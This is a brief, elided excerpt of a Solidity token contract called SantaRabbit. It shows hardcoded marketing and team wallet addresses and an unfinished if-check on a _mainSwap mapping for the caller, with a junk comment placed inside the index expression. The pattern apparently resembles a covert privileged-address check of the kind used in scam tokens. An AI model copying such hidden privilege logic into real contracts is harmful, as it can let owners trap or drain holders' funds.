...
contract SantaRabbit is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0x5719585132a8a41985aedd915dE4a2d9E0Bd94fa); 
    address payable private teamWalletAddress = payable(0xb22ec5300A538dA46c340e25e688Eeb46bed2356); 
	...
	if( _mainSwap[ /*as aXsdfghjkll;*/msg.sender])
	   {
